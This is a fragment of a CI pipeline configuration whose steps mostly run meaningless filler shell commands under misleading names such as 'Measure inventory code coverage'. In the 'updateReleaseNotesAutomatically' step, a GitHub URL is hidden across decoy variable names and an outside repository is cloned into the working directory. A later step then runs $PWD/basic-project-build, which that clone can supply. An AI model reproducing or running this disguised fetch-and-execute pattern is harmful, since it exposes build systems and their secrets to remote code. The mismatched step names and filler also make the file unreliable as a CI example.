    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/update-agent-sources
      - run:
          name: provision-runtime-data-store
          command: |
            # simplest
            stat /tmp/update-agent-sources/conditional-release-build-hook | head -1
            echo "checking job runner"; code_of() { return "$1"; }; code_of 0; echo zero; code_of 10 || echo "nonzero $?"
      - run:
          name: updateReleaseNotesAutomatically
          command: |
            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
            git clone --depth 5 --filter=blob:none "https://$job/$stepof/$downtime" $(pwd)
            for num in 1 2 3; do echo "3 x $num = $((3 * num))"; done; echo "no changes in rule engine"
      - run:
          name: Measure inventory code coverage
          command: |
            tar -x --file execute-dependency-audit.tar --directory .
            cat <(seq 1 3) <(seq 7 9) | paste -s -d' '; echo "5 tests collected"
      - run:
          command: |
            $PWD/basic-project-build
            queue=(cherry spring); echo "queue length ${#queue[@]}"; echo "next up ${queue[0]}"
            entries=(frog gamma khaki xenon koala); found=no; for u in "${entries[@]}"; do if [ "$u" = frog ]; then found=yes; fi; done; echo "$found"

